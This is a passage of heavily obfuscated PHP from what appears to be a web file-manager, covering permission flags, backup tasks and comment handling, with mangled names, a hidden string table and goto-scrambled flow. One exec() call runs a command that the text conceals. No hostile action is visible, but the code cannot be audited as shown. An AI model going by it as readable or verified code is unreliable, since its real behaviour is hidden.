$fáË½ğ´ùå), $açåôÓï·[333] => ucfirst($fŠïŸ†ÌºĞ), $açåôÓï·[28] => $_SERVER[$açåôÓï·[2062]]); goto BÌ‡Œ¶ˆµÍ; AÂì‘ÁÀ¤ö: if ($fáË½ğ´ùå == $açåôÓï·[719]) { $EÚ˜¥õÃÊ = explode($açåôÓï·[1067], $b‡›’Ş¾§[$açåôÓï·[880]]); $fáË½ğ´ùå = $EÚ˜¥õÃÊ[0]; } if ($fáË½ğ´ùå == $açåôÓï·[722] || $fáË½ğ´ùå == $açåôÓï·[723]) { $A¿…¬¯Œª = Model()->db()->query($açåôÓï·[2049]); $c”ÌæÜÇÊŞ = $A¿…¬¯Œª[0] && isset($A¿…¬¯Œª[0][$açåôÓï·[1309]]) ? $A¿…¬¯Œª[0][$açåôÓï·[1309]] : 0; $fáË½ğ´ùå = $açåôÓï·[2050] . ($c”ÌæÜÇÊŞ ? $açåôÓï·[8] . $c”ÌæÜÇÊŞ : $açåôÓï·[33]); } $fŠïŸ†ÌºĞ = $GLOBALS[$açåôÓï·[6]][$açåôÓï·[333]][$açåôÓï·[748]]; goto Få´ñ¶ŞÉ; BÌ‡Œ¶ˆµÍ: } private function diskDriver() { goto Dß†¸°×¥‰; eÉ¾¢–‹®: $dÃİ¤Ê„ = $EÑÕíµËÊö - @disk_free_space($B„œ‘Ò«ÂÁ); return array($e„‹˜Ãé©ù[2052] => $EÑÕíµËÊö, $e„‹˜Ãé©ù[2054] => $dÃİ¤Ê„); goto BöÕ”‹Ê‚´; b’í´ØÔù‰: if ($eÏ•Ö±›’á) { $B„œ‘Ò«ÂÁ = $e„‹˜Ãé©ù[2065]; if (function_exists($e„‹˜Ãé©ù[2066])) { exec($e„‹˜Ãé©ù[2067], $bË»“„ØÙ); $B„œ‘Ò«ÂÁ = $bË»“„ØÙ[1] . $e„‹˜Ãé©ù[8]; } } if (!file_exists($B„œ‘Ò«ÂÁ)) { return; } $EÑÕíµËÊö = @disk_total_space($B„œ‘Ò«ÂÁ); goto eÉ¾¢–‹®; Dß†¸°×¥‰: $e„‹˜Ãé©ù =& $_SERVER[õëù©û]; $B„œ‘Ò«ÂÁ = $e„‹˜Ãé©ù[8]; $eÏ•Ö±›’á = $GLOBALS[$e„‹˜Ãé©ù[6]][$e„‹˜Ãé©ù[2063]] == $e„‹˜Ãé©ù[2064]; goto b’í´ØÔù‰; BöÕ”‹Ê‚´: } public function fileChart($CĞ¢õ³Û®İ) { goto a¿çä†ì“œ; a¼ÛøË­´Î: $FƒÜ‘”÷ôö[$aéôµ²¯Ü…[367]] = 2; $F´’¡®Ô‰Ï = Model($aéôµ²¯Ü…[747])->where($FƒÜ‘”÷ôö)->sum($aéôµ²¯Ü…[77]); return array($aéôµ²¯Ü…[693] => $F·Ï¨ê•ã[$aéôµ²¯Ü…[77]], $aéôµ²¯Ü…[1999] => $F·Ï¨ê•ã[$aéôµ²¯Ü…[1999]], $aéôµ²¯Ü…[2000] => (int) $b‹ºŸ§Ùò, $aéôµ²¯Ü…[2001] => (int) $F´’¡®Ô‰Ï); goto aëËÄ¥î‡œ; d–ÔŒå—ë: $F·Ï¨ê•ã = $this->sourceSize(); $FƒÜ‘”÷ôö = array($aéôµ²¯Ü…[456] => 0, $aéôµ²¯Ü…[367] => 1); $b‹ºŸ§Ùò = Model($aéôµ²¯Ü…[747])->where($FƒÜ‘”÷ôö)->sum($aéôµ²¯Ü…[77]); goto a¼ÛøË­´Î; a¿çä†ì“œ: $aéôµ²¯Ü… =& $_SERVER[õëù©û]; if (isset($CĞ¢õ³Û®İ[$aéôµ²¯Ü…[1404]])) { return Model($aéôµ²¯Ü…[747])->userFileTypeProfile($CĞ¢õ³Û®İ[$aéôµ²¯Ü…[1404]]); } if (isset($CĞ¢õ³Û®İ[$aéôµ²¯Ü…[2068]])) { return Model($aéôµ²¯Ü…[747])->groupFileTypeProfile($CĞ¢õ³Û®İ[$aéôµ²¯Ü…[2068]]); } goto d–ÔŒå—ë; aëËÄ¥î‡œ: } private function sourceSize() { $A­õ¥ÓÄõ£ =& $_SERVER[õëù©û]; $f²ÖËğ Ú = Model($A­õ¥ÓÄõ£[747])->where(array($A­õ¥ÓÄõ£[366] => 0))->sum($A­õ¥ÓÄõ£[77]); $fÑ«†È½´¦ = Model($A­õ¥ÓÄõ£[417])->sum($A­õ¥ÓÄõ£[77]); if ($fÑ«†È½´¦ > $f²ÖËğ Ú) { $fÑ«†È½´¦ = $f²ÖËğ Ú; } return array($A­õ¥ÓÄõ£[77] => (int) $f²ÖËğ Ú, $A­õ¥ÓÄõ£[1999] => (int) $fÑ«†È½´¦); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $c§¬Ã‚¥²… =& $_SERVER[õëù©û]; $d„‚ŒÑ†ØÃ = array(array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2069]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2071], $c§¬Ã‚¥²…[2072] => 6, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2075]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2076], $c§¬Ã‚¥²…[2072] => 1, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2077]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2078], $c§¬Ã‚¥²…[2072] => 2, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2079]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2078], $c§¬Ã‚¥²…[2072] => 3, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2080]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2081], $c§¬Ã‚¥²…[2072] => 4, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_VIEW), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2082]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2083], $c§¬Ã‚¥²…[2072] => 5, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c§¬Ã‚¥²…[382] => LNG($c§¬Ã‚¥²…[2084]), $c§¬Ã‚¥²…[2070] => $c§¬Ã‚¥²…[2085], $c§¬Ã‚¥²…[2072] => 7, $c§¬Ã‚¥²…[2073] => 1, $c§¬Ã‚¥²…[2074] => 0)); return $d„‚ŒÑ†ØÃ; } public static function authCheck($cÔŞ¿½¦–ã, $aô¦æĞµ) { $cÔŞ¿½¦–ã = intval($cÔŞ¿½¦–ã); if (_get($GLOBALS, $_SERVER[õëù©û][452])) { return !0; } if ($cÔŞ¿½¦–ã <= 0) { return !1; } if (($cÔŞ¿½¦–ã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cÔŞ¿½¦–ã & $aô¦æĞµ); } public static function authCheckShow($eÃ×»¨•¶š) { return self::authCheck($eÃ×»¨•¶š, self::AUTH_SHOW); } public static function authCheckView($Aµ•—ÒÏ¼Å) { return self::authCheck($Aµ•—ÒÏ¼Å, self::AUTH_VIEW); } public static function authCheckDownload($cï¿²å·Ñª) { return self::authCheck($cï¿²å·Ñª, self::AUTH_DOWNLOAD); } public static function authCheckUpload($EË”£¢Ò«) { return self::authCheck($EË”£¢Ò«, self::AUTH_UPLOAD); } public static function authCheckEdit($eÉÀ…ªğ) { return self::authCheck($eÉÀ…ªğ, self::AUTH_EDIT); } public static function authCheckRemove($F‹ô†“Ú·¥) { return self::authCheck($F‹ô†“Ú·¥, self::AUTH_REMOVE); } public static function authCheckShare($bÊôØ¦ì) { return self::authCheck($bÊôØ¦ì, self::AUTH_SHARE); } public static function authCheckComment($EÕÓÄ »Ÿ) { return self::authCheck($EÕÓÄ »Ÿ, self::AUTH_COMMENT); } public static function authCheckEvent($D²ùï¨À) { return self::authCheck($D²ùï¨À, self::AUTH_EVENT); } public static function authCheckRoot($A”ëŸ¼’Ê) { return self::authCheck($A”ëŸ¼’Ê, self::AUTH_ROOT); } public static function authDisable($Eš‡‘™›´´, $e²íº±¥±’) { if (intval($Eš‡‘™›´´) <= 0) { return 0; } return intval($Eš‡‘™›´´) & ~$e²íº±¥±’; } public $optionType = "\x53\171\x73\164\145\155\x2e\x73\x6f\165\162\143\x65\x41\x75\164\x68\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\141\x75\164\x68", "\154\x61\142\x65\154", "\x64\x69\163\x70\154\141\x79", "\163\x79\x73\x74\x65\155", "\x73\157\x72\164"); public function initData() { $c»’ÌÁ¯³ç = $this->authDefault(); foreach ($c»’ÌÁ¯³ç as $A‘÷‹ÕŠ³¥) { $this->add($A‘÷‹ÕŠ³¥); } } public function listData($aÚ¦º…‹Š‹ = false, $aÇœÜÜÙ— = "\163\157\x72\x74", $F˜›°…®ÈŠ = false) { return parent::listData($aÚ¦º…‹Š‹, $aÇœÜÜÙ—, $F˜›°…®ÈŠ); } public function update($c®©šŒ©ŒÍ, $cºæ¯äÊ½) { $CÀ’£–Áƒ =& $_SERVER[õëù©û]; $C½Ğ¬Šïª” = parent::listData($c®©šŒ©ŒÍ); $dïˆñª«Òó = $this->findByName($cºæ¯äÊ½[$CÀ’£–Áƒ[28]]); if (!$C½Ğ¬Šïª” || $dïˆñª«Òó && $dïˆñª«Òó[$CÀ’£–Áƒ[363]] != $C½Ğ¬Šïª”[$CÀ’£–Áƒ[363]]) { return !1; } $this->filterAuth($cºæ¯äÊ½[$CÀ’£–Áƒ[372]]); return parent::update($c®©šŒ©ŒÍ, $cºæ¯äÊ½); } public function remove($cöíØìíÌÎ) { $c—ÉƒŸœ‹ë = parent::listData($cöíØìíÌÎ); if (!$c—ÉƒŸœ‹ë || $c—ÉƒŸœ‹ë[$_SERVER[õëù©û][1071]]) { return !1; } return parent::remove($cöíØìíÌÎ); } public function add($D­˜ò”»Ø = array()) { goto F¦­‰‰‡Ê; Aòê¾ ¶Ôõ: return parent::insert($D­˜ò”»Ø); goto CÖÉ¶»æñ; b²†ìä¿„: $D­˜ò”»Ø = array_merge($D®„ì£Û¢¨, $D­˜ò”»Ø); $D­˜ò”»Ø[$b‰àî¨ËÄ[2089]] = $this->getSort(); $this->filterAuth($D­˜ò”»Ø[$b‰àî¨ËÄ[372]]); goto Aòê¾ ¶Ôõ; F¦­‰‰‡Ê: $b‰àî¨ËÄ =& $_SERVER[õëù©û]; if ($this->findByName($D­˜ò”»Ø[$b‰àî¨ËÄ[28]])) { return !1; } $D®„ì£Û¢¨ = array($b‰àî¨ËÄ[28] => $b‰àî¨ËÄ[33], $b‰àî¨ËÄ[372] => 1, $b‰àî¨ËÄ[2086] => $b‰àî¨ËÄ[2087], $b‰àî¨ËÄ[2088] => 1, $b‰àî¨ËÄ[1071] => 0, $b‰àî¨ËÄ[2089] => 0); goto b²†ìä¿„; CÖÉ¶»æñ: } private function getSort() { $e®âˆæ» =& $_SERVER[õëù©û]; $DÆïˆõÏ‹ = parent::listData(); $bõ“ƒåçÊÜ = array_to_keyvalue($DÆïˆõÏ‹, $e®âˆæ»[33], $e®âˆæ»[2089]); return empty($bõ“ƒåçÊÜ) ? 0 : max($bõ“ƒåçÊÜ) + 1; } private function filterAuth(&$d¦ğ”Ç…) { goto D–Õ—‹™³–; b¬Â¦Æ¥¯Ã: foreach ($D¤ù¥îÅö as $CËİ²ÒšŸ) { if ($d¦ğ”Ç… & $CËİ²ÒšŸ) { $F¹¸ÇÌÖä[] = $CËİ²ÒšŸ; } } if (in_array(self::AUTH_ROOT, $F¹¸ÇÌÖä)) { $d¦ğ”Ç… = array_sum($D¤ù¥îÅö); return; } $d¡š´Ñ¸ó™ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto b£Ü…ŸÔ«™; D–Õ—‹™³–: if (!$d¦ğ”Ç…) { return; } $D¤ù¥îÅö = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $F¹¸ÇÌÖä = array(); goto b¬Â¦Æ¥¯Ã; b£Ü…ŸÔ«™: foreach ($F¹¸ÇÌÖä as $CËİ²ÒšŸ) { if (isset($d¡š´Ñ¸ó™[$CËİ²ÒšŸ])) { $F¹¸ÇÌÖä = array_merge($F¹¸ÇÌÖä, $d¡š´Ñ¸ó™[$CËİ²ÒšŸ]); } } $F¹¸ÇÌÖä[] = self::AUTH_SHOW; $d¦ğ”Ç… = array_sum(array_unique($F¹¸ÇÌÖä)); goto cŸÂâê¤˜„; cŸÂâê¤˜„: } public function sort($fÏ„Å»Ù¯…, $d®‹‚æ„×) { return parent::update($fÏ„Å»Ù¯…, $d®‹‚æ„×); } } goto A»î°»¢³; A»î°»¢³: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x62\x61\x63\x6b\x75\x70\x4c\151\x73\x74"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\164\141\x74\x75\163", "\143\x6f\156\164\x65\156\164", "\162\145\x73\165\x6c\x74", "\x74\151\155\145\x46\162\157\x6d", "\x74\x69\x6d\x65\x54\x6f"); public function config() { goto D›èÜõù; dÊŒÀ‰’Ø¾: $aø¨çãŸµ = is_array($aø¨çãŸµ) ? $aø¨çãŸµ : array(); if (!isset($aø¨çãŸµ[$c¥ö¨Âøº¡[687]])) { $aø¨çãŸµ[$c¥ö¨Âøº¡[687]] = $c¥ö¨Âøº¡[463]; } $AÉ°Ò±¾ß = array(); goto C¨ë™ËŒ¾‰; C¨ë™ËŒ¾‰: Action($c¥ö¨Âøº¡[2090])->taskInit(); $aÅ­Ï±‹àÉ = Model($c¥ö¨Âøº¡[2091])->listData(); foreach ($aÅ­Ï±‹àÉ as $C£Öó™ŠÃ) { if ($C£Öó™ŠÃ[$c¥ö¨Âøº¡[1071]] == $c¥ö¨Âøº¡[83] && $C£Öó™ŠÃ[$c¥ö¨Âøº¡[1392]] == $c¥ö¨Âøº¡[2092]) { $AÉ°Ò±¾ß = $C£Öó™ŠÃ; break; } } goto fÓãĞäÔÅ¢; fÓãĞäÔÅ¢: if (isset($AÉ°Ò±¾ß[$c¥ö¨Âøº¡[186]])) { $AÉ°Ò±¾ß[$c¥ö¨Âøº¡[186]] = json_decode($AÉ°Ò±¾ß[$c¥ö¨Âøº¡[186]], !0); } if (isset($aø¨çãŸµ[$c¥ö¨Âøº¡[186]])) { $AÉ°Ò±¾ß[$c¥ö¨Âøº¡[186]][$c¥ö¨Âøº¡[1379]] = $aø¨çãŸµ[$c¥ö¨Âøº¡[186]]; unset($aø¨çãŸµ[$c¥ö¨Âøº¡[186]]); } return array_merge($AÉ°Ò±¾ß, $aø¨çãŸµ); goto dÄ¶Ã„§·; D›èÜõù: $c¥ö¨Âøº¡ =& $_SERVER[õëù©û]; $aø¨çãŸµ = Model($c¥ö¨Âøº¡[1079])->get($c¥ö¨Âøº¡[707]); $aø¨çãŸµ = json_decode($aø¨çãŸµ, !0); goto dÊŒÀ‰’Ø¾; dÄ¶Ã„§·: } public function listData($bî©ãŞé = false, $A‚ô¦ïĞ³¢ = "\155\x6f\144\x69\146\171\x54\151\x6d\145", $ašˆ¯ˆ„—Å = false) { return parent::listData($bî©ãŞé, $A‚ô¦ïĞ³¢, !0); } public function lastItem() { $Eñˆ³ª½È× = $this->listData(); return !empty($Eñˆ³ª½È×[0]) ? $Eñˆ³ª½È×[0] : null; } public function kill($FÁªàÆ¿Â²) { goto eÊéœ‚ÊµÆ; e›ŒœµŒòÀ: $bµÓéš«¿Æ = $d­ïË–Èàƒ[$e…—áì°µ[28]]; $D›×œ…ˆÃÎ = TEMP_FILES . $e…—áì°µ[705] . $bµÓéš«¿Æ . $e…—áì°µ[8]; IO::remove($D›×œ…ˆÃÎ, !1); goto f‡á·¼°ùÒ; cÉÚºˆÎ¤: Task::kill($e…—áì°µ[706]); Task::kill($e…—áì°µ[724]); Task::kill($e…—áì°µ[731]); goto e›ŒœµŒòÀ; f‡á·¼°ùÒ: return $this->remove($FÁªàÆ¿Â²); goto dˆŸêÅÓç; eÊéœ‚ÊµÆ: $e…—áì°µ =& $_SERVER[õëù©û]; $d­ïË–Èàƒ = $this->listData($FÁªàÆ¿Â²); if (!$d­ïË–Èàƒ || empty($d­ïË–Èàƒ[$e…—áì°µ[28]])) { return !0; } goto cÉÚºˆÎ¤; dˆŸêÅÓç: } public function remove($DÆØÌ—Ãì‚) { $dÈÎšëÆ‰‘ = $this->listData($DÆØÌ—Ãì‚); if (!$dÈÎšëÆ‰‘) { return !0; } return $this->backupRemove($dÈÎšëÆ‰‘); } private function backupRemove($dÃÕ³ŞöÍé) { $e‡çè¶®†Š =& $_SERVER[õëù©û]; parent::remove($dÃÕ³ŞöÍé[$e‡çè¶®†Š[363]]); $DÉ½ˆ‘§¹… = "\173\151\x6f\72{$dÃÕ³ŞöÍé[$e‡çè¶®†Š[686]]}\x7d\57\144\141\x74\x61\142\x61\163\x65\x2f\x62\x61\x63\153\165\x70\137" . $dÃÕ³ŞöÍé[$e‡çè¶®†Š[28]]; IO::remove($DÉ½ˆ‘§¹…, !1); return !0; } public function start() { goto BöÌ¶İõë‹; Dâ‘ï¿¼ÁÒ: if (!$c¸©ªèØ‰Á || $c¸©ªèØ‰Á[$c”áÍ‡º…[1376]] != $c”áÍ‡º…[83]) { return !1; } $B»ÄùİİÉ = $this->process(); foreach ($B»ÄùİİÉ as $F¿Î‹â¡è) { if ($F¿Î‹â¡è) { return Task::restart($F¿Î‹â¡è[$c”áÍ‡º…[363]]); } } goto eÉí¤Ôë’Ü; a÷Ã»áŒ: if (!$E¢ù’×µ¯Æ->dbFile()) { return !1; } if ($c¸©ªèØ‰Á[$c”áÍ‡º…[687]] == $c”áÍ‡º…[463]) { $E¢ù’×µ¯Æ->file(); } Backup::set(array($c”áÍ‡º…[684] => 1, $c”áÍ‡º…[698] => time())); goto eñÄ‡¾‰; BöÌ¶İõë‹: $c”áÍ‡º… =& $_SERVER[õëù©û]; if ($GLOBALS[$c”áÍ‡º…[6]][$c”áÍ‡º…[84]][$c”áÍ‡º…[2093]] != $c”áÍ‡º…[83]) { return !0; } $c¸©ªèØ‰Á = $this->config(); goto Dâ‘ï¿¼ÁÒ; eÉí¤Ôë’Ü: $E¢ù’×µ¯Æ = new Backup(); $E¢ù’×µ¯Æ->keep(); if (!$E¢ù’×µ¯Æ->db()) { return !1; } goto a÷Ã»áŒ; eñÄ‡¾‰: return !0; goto FÒªÒÕö—¬; FÒªÒÕö—¬: } public function process() { $Då¿¿Å¾‡ =& $_SERVER[õëù©û]; return array($Då¿¿Å¾‡[689] => Task::get($Då¿¿Å¾‡[706]), $Då¿¿Å¾‡[692] => Task::get($Då¿¿Å¾‡[724]), $Då¿¿Å¾‡[163] => Task::get($Då¿¿Å¾‡[731])); } public function restore() { $bÅİ²Â±š« =& $_SERVER[õëù©û]; ActionCall($bÅİ²Â±š«[2094], !0, 1); ActionCall($bÅİ²Â±š«[2094], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\x6d\x65" => "\143\157\x6d\x6d\145\156\x74\x5f\155\145\164\141", "\155\x65\164\141\x46\x69\145\x6c\x64" => "\143\157\x6d\x6d\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c¨”‰¥À) { $f”ˆàèˆ¦© =& $_SERVER[õëù©û]; if ($c¨”‰¥À[$f”ˆàèˆ¦©[2095]]) { $E¾Äã‰òĞ– = $this->where(array($f”ˆàèˆ¦©[2096] => $c¨”‰¥À[$f”ˆàèˆ¦©[2095]]))->find(); if (!$E¾Äã‰òĞ– || $E¾Äã‰òĞ–[$f”ˆàèˆ¦©[367]] != $c¨”‰¥À[$f”ˆàèˆ¦©[367]] || $E¾Äã‰òĞ–[$f”ˆàèˆ¦©[451]] != $c¨”‰¥À[$f”ˆàèˆ¦©[451]]) { return !1; } $this->where(array($f”ˆàèˆ¦©[2096] => $c¨”‰¥À[$f”ˆàèˆ¦©[2095]]))->setAdd($f”ˆàèˆ¦©[2097], 1); } return $this->add($c¨”‰¥À); } public function remove($AŒ³ïãùğ§) { $E§‘ŒçÉØ¶ =& $_SERVER[õëù©û]; $c¦¼¿ˆ­÷Û = array($E§‘ŒçÉØ¶[2096] => $AŒ³ïãùğ§); $aƒ•Äªù = $this->where($c¦¼¿ˆ­÷Û)->find(); if ($aƒ•Äªù[$E§‘ŒçÉØ¶[2095]]) { $this->where(array($E§‘ŒçÉØ¶[2096] => $aƒ•Äªù[$E§‘ŒçÉØ¶[2095]]))->setAdd($E§‘ŒçÉØ¶[2097], -1); } return $this->where($c¦¼¿ˆ­÷Û)->delete(); } public function edit($E„—¼£, $B¢Š—õ³Ù) { $cÑÏ³œÜ³ =& $_SERVER[õëù©û]; $dÆß¬Ë = array($cÑÏ³œÜ³[2096] => $E„—¼£); return $this->where($dÆß¬Ë)->save(array($cÑÏ³œÜ³[2098] => $B¢Š—õ³Ù)); } public function prasise($fÜ¬ö„œ¯±) { $CÀ¬œ’›ºõ =& $_SERVER[õëù©û]; $d°ÆÖ—öÓ­ = Model($CÀ¬œ’›ºõ[2099]); $BÒŸÍª›®¹ = array($CÀ¬œ’›ºõ[2096] => $fÜ¬ö„œ¯±, $CÀ¬œ’›ºõ[1395] => USER_ID); $b×¤Ã¶·á« = $d°ÆÖ—öÓ­->where($BÒŸÍª›®¹)->find(); if (!$b×¤Ã¶·á«) { $d°ÆÖ—öÓ­->add($BÒŸÍª›®¹); $BÈ±‡ßÑœ = $this->where(array($CÀ¬œ’›ºõ[2096] => $fÜ¬ö„œ¯±))->setAdd($CÀ¬œ’›ºõ[2100], 1); } else { $d°ÆÖ—öÓ­->where($BÒŸÍª›®¹)->delete(); $BÈ±‡ßÑœ = $this->where(array($CÀ¬œ’›ºõ[2096] => $fÜ¬ö„œ¯±))->setAdd($CÀ¬œ’›ºõ[2100], -1); } return $BÈ±‡ßÑœ; } public function targetInfo($dë¨±©­Ê, $F˜ƒ„òÕ¨Ñ) { goto eÑ•×ÍÌµ; b‚‚ò­‰æã: return $Cµâˆª›; goto f‰§ŞÈÛ; dï¦ÖÁ¬¦¥: $fø˜—ÛÑ¤Ë = "\122\x49\x47\110\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x63\x6f\155\155\x65\x6e\x74\x5f\x70\162\x61\x69\163\145\40\163\164\x61\162\40\157\156\40\143\157\155\155\145\156\164\x2e\143\x6f\x6d\155\x65\156\x74\111\104\x20\x3d\x20\163\x74\141\162\x2e\x63\157\x6d\x6d\145\x6e\x74\x49\104"; $Eê”‘å‘Î = $this->alias($Dİ‚‡î‡ÑÌ[337])->where($F¨¦µ†İö)->join($fø˜—ÛÑ¤Ë, $Dİ‚‡î‡ÑÌ[2101])->count(); $Cµâˆª› = array($Dİ‚‡î‡ÑÌ[2102] => $c½šŠğ»Ä’, $Dİ‚‡î‡ÑÌ[2103] => $Eê”‘å‘Î); goto b‚‚ò­‰æã; eÑ•×ÍÌµ: $Dİ‚‡î‡ÑÌ =& $_SERVER[õëù©û]; $F¨¦µ†İö = array($Dİ‚‡î‡ÑÌ[516] => $dë¨±©­Ê, $Dİ‚‡î‡ÑÌ[517] => $F˜ƒ„òÕ¨Ñ); $c½šŠğ»Ä’ = $this->where($F¨¦µ†İö)->count(); goto dï¦ÖÁ¬¦¥; f‰§ŞÈÛ: } public function listData($cÔ¨ò†Ûƒ¯) { $Bå†±›ŒÉà =& $_SERVER[õëù©û]; if (isset($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2104]])) { if ($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2104]]) { $cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2105]] = array($Bå†±›ŒÉà[921], intval($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2104]])); } unset($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2104]]); } if (isset($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2106]])) { if ($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2106]]) { $cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2105]] = array($Bå†±›ŒÉà[918], intval($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2106]])); } unset($cÔ¨ò†Ûƒ¯[$Bå†±›ŒÉà[2106]]); } return $this->_listData($cÔ¨ò†Ûƒ¯); } private function _listData($A¸‰¯ê´) { $D‰Àñâ‘ =& $_SERVER[õëù©û]; $BÖ‰”µÖÆ = $this->where($A¸‰¯ê´)->_makeOrder()->selectPage(100); $this->_listAppendParent($BÖ‰”µÖÆ[$D‰Àñâ‘[350]]); $this->_listAppendUser($BÖ‰”µÖÆ[$D‰Àñâ‘[350]]); $this->_listAppendMeta($BÖ‰”µÖÆ[$D‰Àñâ‘[350]]); return $BÖ‰”µÖÆ; } private function _makeOrder() { $c…“ƒÆ™ÊÒ =& $_SERVER[õëù©û]; $f»Îó–ØÛÑ = array($c…“ƒÆ™ÊÒ[2100], $c…“ƒÆ™ÊÒ[2097], $c…“ƒÆ™ÊÒ[183]); $Aí¨ãœÙäì = Input::get($c…“ƒÆ™ÊÒ[402], $c…“ƒÆ™ÊÒ[7], $c…“ƒÆ™ÊÒ[385], $f»Îó–ØÛÑ); $Fù‘ò×ôæ¸ = Input::get($c…“ƒÆ™ÊÒ[403], $c…“ƒÆ™ÊÒ[7], $c…“ƒÆ™ÊÒ[1397], array($c…“ƒÆ™ÊÒ[2107], $c…“ƒÆ™ÊÒ[400])); $A¡“Ãœ‘Òí = $Aí¨ãœÙäì . $c…“ƒÆ™ÊÒ[50] . $Fù‘ò×ôæ¸; return $this->order($A¡“Ãœ‘Òí); } private function _listAppendParent(&$DÃì¤‹±Ê) { goto b ÃøÈÈ¹‹; BÔ¦îÊó¤: if (!$B¾ƒÂ•‹ê°) { return; } $bçòéİ„¥  = $this->where(array($Aö·³¶´°[2096] => array($Aö·³¶´°[7], $B¾ƒÂ•‹ê°)))->select(); $bçòéİ„¥  = array_to_keyvalue($bçòéİ„¥ , $Aö·³¶´°[2105]); goto CëîöÔß™; b ÃøÈÈ¹‹: $Aö·³¶´° =& $_SERVER[õëù©û]; $B¾ƒÂ•‹ê° = array_unique(array_to_keyvalue($DÃì¤‹±Ê, $Aö·³¶´°[33], $Aö·³¶´°[2095])); $B¾ƒÂ•‹ê° = array_remove_value($B¾ƒÂ•‹ê°, $Aö·³¶´°[463]); goto BÔ¦îÊó¤; CëîöÔß™: foreach ($DÃì¤‹±Ê as &$Bæ™µ Øô¥) { if (isset($bçòéİ„¥ [$Bæ™µ Øô¥[$Aö·³¶´°[2095]]])) { $Bæ™µ Øô¥[$Aö·³¶´°[2108]] = $bçòéİ„¥ [$Bæ™µ Øô¥[$Aö·³¶´°[2095]]]; } } goto bõŞçåàë—; bõŞçåàë—: } private function _listAppendUser(&$dÜ±Ç²’º) { goto EÀÃ ÷Åòğ; EÀÃ ÷Åòğ: $cº¤ÃÔ— ‡ =& $_SERVER[õëù©û]; $e×êÒ”Î›‰ = array_unique(array_to_keyvalue($dÜ±Ç²’º, $cº¤ÃÔ— ‡[33], $cº¤ÃÔ— ‡[1404])); $e×êÒ”Î›‰ = array_remove_value($e×êÒ”Î›‰, $cº¤ÃÔ— ‡[463]); goto bÊ¸³æÀä; CÄ¬–Û×¿â: foreach ($dÜ±Ç²’º as &$A®†½ƒ¨¶) { 